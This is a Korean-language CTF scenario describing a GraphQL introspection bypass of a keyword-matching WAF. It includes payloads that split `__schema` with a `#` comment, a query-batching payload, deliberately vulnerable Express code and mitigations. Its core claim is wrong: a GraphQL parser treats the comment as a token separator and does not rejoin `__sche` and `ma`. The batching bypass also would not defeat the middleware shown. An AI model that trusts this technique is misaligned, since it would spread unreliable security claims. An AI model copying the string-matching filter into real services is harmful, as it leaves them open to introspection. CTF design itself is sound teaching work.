---
title: GraphQL Introspection Bypass via Comments and Batching — Web CTF Scenario
created: 2026-06-14
updated: 2026-06-14
type: ctf-scenario
tags: [ctf, web, graphql, introspection-bypass, WAF-bypass, query-batching, comments]
confidence: high
---

# GraphQL Introspection Bypass via Comments and Batching — Web CTF Scenario

## 1. 개요 및 스토리
- **문제명**: Secure Data Portal API (보안 데이터 포털 API)
- **난이도**: Medium-High
- **핵심 컨셉**: GraphQL 보안 솔루션 및 WAF(웹 애플리케이션 방화벽)의 미흡한 문자열 검사 로직을 무력화하는 **GraphQL 인트로스펙션 우회** 취약점 문제입니다. 대상 애플리케이션은 스키마 유출을 막기 위해 게이트웨이 및 프론트 WAF 단에서 인입되는 HTTP 바디 내의 `__schema` 및 `__type` 키워드가 탐지되면 요청을 즉시 차단합니다. 그러나 공격자는 GraphQL 쿼리 파서가 줄바꿈, 탭, 주석 기호(`#`)를 해석하는 명세 상의 허점 및 여러 쿼리를 배열로 묶어 보내는 **쿼리 배칭(Query Batching)** 기능을 연계하여 WAF의 정적 문자열 스캔 필터를 우회 통과시키고 API 인트로스펙션을 가동시켜 은폐된 관리자 데이터 필드 정보를 획득합니다.

---

## 2. 문제 설계 및 구조 (Architecture)

### 2.1 구성 요소
- **Frontend WAF / Gateway**:
  - 클라이언트가 전송한 POST 요청 바디에서 `__schema` 나 `__type` 문자열이 단순 매칭되면 `403 Forbidden`을 회신하며 전송 차단.
- **Backend GraphQL Service**:
  - 실제 질의를 해석하고 파싱하여 스키마 구조에 따라 데이터를 리턴.
- **Flag 위치**:
  - 우회 인트로스펙션을 통해 알아낸 비공개 쿼리 `hiddenFlagNode`를 정상 질의하여 받아오는 플래그 문자열.

### 2.2 취약점 지점
1. **Flawed WAF String Matching**:
   - WAF는 수신된 쿼리의 원시 텍스트(Raw Body Text)가 공백 등으로 끊어진 정확한 문자열 패턴인지만 체크하거나 단순 정규식으로 차단을 판단합니다.
2. **GraphQL Parser Token Ignorance**:
   - GraphQL 명세상 쿼리 컴파일 파서는 문자열 내부의 주석 기호(`#`) 뒤 문자열 및 탭, 줄바꿈을 문법 분석 단계에서 유연하게 무시하고 결합하여 정상 해석합니다.
   - 또한, 쿼리 배칭이 지원될 때 여러 쿼리 객체 중 일부 객체에 숨겨진 쿼리를 심고 다른 객체에는 일반 쿼리를 심으면, WAF는 최상단 일반 객체만 파악해 흘려보내지만 백엔드는 배열 내 모든 쿼리를 순차 수행하게 됩니다.

---

## 3. 공격 면 (Attack Surface)

| 엔드포인트 | 수신 게이트웨이 검증 정책 | WAS 파서 사양 | 주입 우회 구문 특징 |
|------------|---------------------------|--------------|---------------------|
| `/graphql` | 바디 내 `__schema` 문자열 차단 | GraphQL AST 주석 무시 및 Batching 지원 | `#` 주석 분할 / Array Batching 활용 |

---

## 4. 상세 풀이 흐름 (Exploitation Flow)

### Step 1. Introspection 차단 확인
1. 공격자는 스키마 수집을 위해 표준 인트로스펙션 쿼리를 보냅니다.
   ```http
   POST /graphql
   {"query": "query { __schema { types { name } } }"}
   ```
2. WAF 필터가 이를 가로채 `403 Forbidden` 에러를 반환하는 것을 관찰합니다.

### Step 2. 주석(Comment) 기호 삽입을 통한 키워드 우회
GraphQL 문법에서 주석(#)은 줄바꿈(%0a)이 나타날 때까지 무시됩니다. 이를 활용하여 문자열 매칭 필터를 깨뜨립니다.
- **우회 페이로드 설계**:
  `__schema` 문자 중간에 줄바꿈과 주석을 배치합니다:
  ```graphql
  __sche# 주석 내용
  ma
  ```
  GraphQL 파서는 `# 주석 내용`과 개행을 잘라내고 남은 문자열인 `__schema`로 온전하게 인식합니다.
- **POST 요청 본문**:
  ```http
  POST /graphql HTTP/1.1
  Content-Type: application/json
  
  {"query": "query { __sche#comment\nma { types { name } } }"}
  ```
- WAF는 `__schema` 문자열이 중간에 끊어져 있어(공격 시그니처 미검출) 요청을 정상 통과시키고, 백엔드 GraphQL 파서는 주석을 스킵하고 정상적으로 인트로스펙션을 가동하여 스키마 데이터를 리턴합니다.

### Step 3. 쿼리 배칭(Query Batching) 우회 패턴
만약 WAF가 개행 주석까지 철저히 감시한다면, 쿼리 배칭 배열(Query Batching Array)을 던져 검사 필터를 회피합니다.
- **배칭 페이로드**:
  ```json
  [
    {
      "query": "query { normalQuery { id } }"
    },
    {
      "query": "query { __schema { types { name } } }"
    }
  ]
  ```
  *(WAF가 JSON의 첫 번째 요소의 `query` 값만 시그니처 검사하도록 잘못 설정되어 있을 시, 두 번째 요소의 인트로스펙션 쿼리가 필터를 우회하여 백엔드로 전달됨)*

### Step 4. flag 획득
1. 주석 우회 방식으로 획득한 스키마 구조에서 숨겨진 API 노드 명칭인 `hiddenFlagNode { flagText }` 속성을 탐지해 냅니다.
2. 해당 노드에 접근하기 위해 동일한 우회 패턴(혹은 일반 질의)을 섞어 요청을 전송합니다:
   ```graphql
   query {
     hiddenFlagNode {
       flagText
     }
   }
   ```
3. 리턴된 응답 결과 JSON에서 플래그(`FLAG{graphql_introspection_comment_and_batching_bypass}`)를 획득합니다.

---

## 5. 취약점 유발 백엔드 코드 스니펫 (Node.js Express + GraphQL)

```javascript
// server.js (취약한 WAF 모킹 미들웨어 및 GraphQL 서버 예시)
const express = require('express');
const { graphqlHTTP } = require('express-graphql');
const { buildSchema } = require('graphql');
const app = express();

app.use(express.json());

// 취약점 지점 1: WAF/게이트웨이를 모킹한 문자열 차단 미들웨어
// 단순히 raw body 내부의 '__schema' 단순 매칭 단어만 체크
app.use('/graphql', (req, res, next) => {
    const rawBody = JSON.stringify(req.body);
    
    // 단순 매칭 방식은 개행 주석(__sche#comment\nma) 형태의 우회 기법을 걸러내지 못함
    if (rawBody.includes('__schema') || rawBody.includes('__type')) {
        return res.status(403).send("WAF Blocked: GraphQL Introspection Forbidden");
    }
    next();
});

const schema = buildSchema(`
  type HiddenFlagNode {
     flagText: String!
  }
  type Query {
    normalQuery: String!
    hiddenFlagNode: HiddenFlagNode
  }
`);

const root = {
    normalQuery: () => "Public Data",
    hiddenFlagNode: () => {
        return { flagText: "FLAG{graphql_introspection_comment_and_batching_bypass}" };
    }
};

app.use('/graphql', graphqlHTTP({
    schema: schema,
    rootValue: root,
    graphiql: false // graphiql UI는 차단
}));

app.listen(8080);
```

---

## 6. 방어 및 완화 기법 (Mitigation)

1. **스키마 인트로스펙션 완전 비활성화 (Disable Introspection)**:
   - 프로덕션(배포) 서비스 환경에서는 게이트웨이 레이어 검사에 의존하지 말고, GraphQL 엔진 설정 자체에서 `introspection: false` 지시어를 명시해 인트로스펙션 질의를 아예 작동 불가능하게 처리합니다.
2. **구문 분석 검증 규칙 삽입 (GraphQL Validation Rules)**:
   - 문자열 매칭 대신, GraphQL 질의 해석 추상 구문 트리(AST) 분석 단계에서 `__schema`와 `__type` 노드를 찾아내 사전에 반려하는 정석적인 검증 룰(NoSchemaIntrospectionRule 등)을 적용합니다.
3. **쿼리 배칭 보안 제어**:
   - 일괄 배칭 요청 시 각 쿼리 객체 배열 내부의 모든 인스턴스를 하나도 빠짐없이 검증하는 루틴을 적용하거나, 복잡도 제한 정책을 세워 인프라를 보강합니다.
